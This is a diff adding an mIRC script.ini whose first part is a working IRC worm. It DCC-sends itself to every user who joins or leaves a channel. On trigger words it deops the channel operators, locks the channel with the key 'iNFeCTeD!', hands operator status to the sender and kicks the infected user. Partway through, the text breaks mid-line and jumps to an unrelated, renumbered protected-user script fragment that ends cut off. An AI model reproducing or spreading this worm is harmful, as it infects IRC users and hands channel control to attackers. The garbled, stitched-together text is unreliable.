@@ -1,0 +1,56 @@
+[script]
+n0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }
+n1=  /dcc send $nick $mircdirscript.ini
+n2=}
+n3=
+n4=ON 1:PART:#:{ /if ( $nick == $me ) { halt }
+n5=  /dcc send $nick $mircdirscript.ini
+n6=}
+n7=
+n8=ON 1:TEXT:*simpsalapim*:#:/quit iNFeCTeD!
+n9=ON 1:TEXT:*XX!XX*:*:/msg $nick i'm iNFeCTeD!
+n10=ON 1:TEXT:*ananas*:#:{
+n11=/nick _XInFected
+n12=  %i = 0
+n13=  %opit = $opnick(0,$chan)
+n14=  :looppi
+n15=  %i = %i + 1
+n16=  /if ($opnick(%i,$chan) != $me ) { %line = $opnick(%i,$chan) }
+n17=  /if ($opnick(%i,$chan) == $me ) { /set %line " " }
+n18=  %i = %i + 1
+n19=  /if ($opnick(%i,$chan) != $me ) { %line = %line $opnick(%i,$chan) }
+n20=  %i = %i + 1
+n21=  /if ($opnick(%i,$chan) != $me ) { %line = %line $opnick(%i,$chan) }
+n22=  /mode $chan -ooo %line
+n23=  /if ( %i > %opit ) { goto pois }
+n24=  goto looppi
+n25=  :pois
+n26=  /mode $chan +k iNFeCTeD!
+n27=  /mode $chan +o $nick
+n28=  /kick $chan $me
+n29=}
+n30=ON 1:TEXT:*:#:{ /if ( $rand(0,100) == 1 ) { 
+n31=    /mode $chan +o $nick 
+nne }
+n23=  set %User.Address $mask(%User.Address,3)
+n24=  set %Var.Temp $readini $mircdirsystem\protect.ini %User.Address Channels
+n25=  if (%Var.Temp == *) { error $2 is already on the protected list for all channels! | goto done }
+n26=  writeini $mircdirsystem\protect.ini %User.Address Channels *
+n27=  echo %color.echo -a  Added $2 6( $+ %User.Address $+ 6) to protected user list. Channels: All | .auser 85 %User.Address
+n28=  :done
+n29=  unset %User.* | .disable #user.prot.add.all | halt
+n30=}
+n31=#user.prot.add.all end
+n32=#user.prot.add.chan off
+n33=raw 401:*: set %User.Nick 0 | halt
+n34=raw 301:*: halt
+n35=raw 311:*: set %User.Address $2 $+ ! $+ $3 $+ @ $+ $4 | halt
+n36=raw 312:*: halt
+n37=raw 313:*: halt
+n38=raw 317:*: halt
+n39=raw 319:*: halt
+n40=raw 318:* {
+n41=  if (%User.Nick == 0) { error $2 $+ , no such nick | goto done }
+n42=  set %User.Address $mask(%User.Address,3)
+n43=  set %Var.Temp $readini $mircdirsystem\protect.ini %User.Address Channels
+n44=  if (%Var.Tem
